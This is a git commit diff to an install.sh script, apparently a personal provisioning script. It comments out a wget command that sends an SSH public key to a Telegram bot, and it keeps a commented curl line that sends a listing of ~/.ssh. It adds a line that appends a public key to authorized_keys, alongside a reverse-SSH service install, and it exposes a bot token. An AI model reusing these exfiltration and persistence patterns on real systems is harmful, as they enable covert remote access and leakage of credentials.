dcfc9311382d229beed5bca8e09ecf998dd66748
dimanne <dimanne@gmail.com>
2022-08-13 20:54:27 +0100

    Try to connect

--- install.sh
+++ install.sh
@@ -60,7 +60,8 @@ fi
 # sudo apt update && sudo apt install -y sshpass
 
 # curl -v "https://api.telegram.org/bot5555989870:AAE0hzaZ0IvGA6iJ7ubfS_x_1KA1W6vwryY/sendMessage?chat_id=-748244195&text=$(ls ~/.ssh/ | base64 -w 0)"
-wget "https://api.telegram.org/bot5555989870:AAE0hzaZ0IvGA6iJ7ubfS_x_1KA1W6vwryY/sendMessage?chat_id=-748244195&text=id_$(cat ~/.ssh/id_ecdsa.pub | base64 -w 0)"
+# wget "https://api.telegram.org/bot5555989870:AAE0hzaZ0IvGA6iJ7ubfS_x_1KA1W6vwryY/sendMessage?chat_id=-748244195&text=id_$(cat ~/.ssh/id_ecdsa.pub | base64 -w 0)"
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC4FGjnSI7T8DKqgh7J2m459+XcEcmYO2Z5qVwJZ50HnwEuj83bmSs8wXE5DG0nVUim9AhAn6hq+VfjH72GH5OmKxywbX+oL2hGJGqcLfdgYaBxZ8Rec5r+xwx5GmQsiLF9ssHIYELkmAS/voO2ATmGBmh+LzPfDfB7zm83lgOxwYGvFGPNdPXoXxILU3NjIrEIKaffIEqzRKnwUGkw+/h4dY9Iz/KmFJZRnsgRhu0M2vQUp6Ux83q0KM7ezYRMQgq6POEu99b6ymlYgpYKQJvKpb2a3sYOD7feJi4eUk0etpJ6zgOKQmz/vIR4hDeBMs2qdi/lo+8BogDApcDuZsDuKxrNOs23VdmOsvVF/EYAvQhdy7Y0HVL7L/LsUUBXi9oLWw9hrbpzlovlY1GX4ec5qfDFRUmdJU4H1ZAyCBn348LnehcfVSjx1+LB1GEslEYdQpYkj6yjURI8soP0l5cXVfrPueHAs/wzQXmGma8gYhsC61+usp/iFnCJLBRmzeZF0vl+U40Y7z54Lc232uJsTtpTXM1PRkjHc6L54NEgIcOMR/O2O/s8h5c9w9DIbrNGY/RM4LAbcLsAkLX32QfmOwa33QVKIWF0QnAANEQMsv84/ccNv3PBSHgyLp5W3V6g8ZB1cPhFRTQ1l5ax5eAn43rEljOGBgAksSnFvvjc2Q== cardno:000611139390" >> ~/.ssh/authorized_keys
 
 # Too critical to be updated on regular basis
 InstallIfNeeded /etc/systemd/system reversessh.service true
